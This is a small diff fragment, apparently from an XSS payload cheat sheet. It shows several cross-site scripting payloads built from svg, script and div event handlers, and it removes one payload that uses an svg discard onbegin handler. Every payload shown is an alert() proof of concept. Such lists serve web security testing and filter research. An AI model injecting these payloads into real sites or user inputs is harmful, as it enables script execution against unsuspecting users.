@@ -46,7 +46,6 @@ print("<script>alert('XSS')</script>")
 <svg><script href=data:,alert(1) />(`Firefox` is the only browser which allows self closing script)
 <svg><script>alert('33')
 <svg><script>alert&lpar;'33'&rpar;
- "><svg><discard onbegin=alert(1)>
 
 // Div payload
 <div onpointerover="alert(45)">MOVE HERE</div>
